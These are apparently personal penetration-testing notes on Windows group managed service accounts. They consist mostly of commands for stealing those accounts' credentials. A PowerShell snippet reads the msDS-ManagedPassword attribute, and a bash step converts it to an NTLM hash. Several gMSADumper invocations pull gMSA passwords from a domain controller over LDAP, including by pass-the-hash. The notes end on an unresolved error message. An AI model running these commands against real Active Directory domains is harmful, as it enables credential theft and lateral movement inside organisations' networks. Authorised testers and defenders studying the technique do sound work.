## GMSA group managed service account
windows AD account with randomized, changing password to prevent kerberoasting service accounts

### read NTLM hash with powershell + python
```powershell
$gmsa = Get-ADServiceAccount -Identity GMSAccount -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
echo $mp
```
```bash
# managed_password is the output of `echo $mp`
cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
~/kb/hacking/windows/convert-msds-managed-password-to-ntlm-hash.py
```

### remote LDAP read GMSA passwords python script
https://github.com/micahvandeusen/gMSADumper
```bash
python3 gMSADumper.py -u user -p password -d domain.local

# Pass the Hash, specific LDAP server:
python gMSADumper.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

# Kerberos Authentication, specific LDAP server:
python gMSADumper.py -k -d domain.local -l dc01.domain.local
```

#### fix missing ConvertFrom-AdManagedPasswordBlob
ConvertFrom-AdManagedPasswordBlob is not recognized as the name of a cmdlet, function...

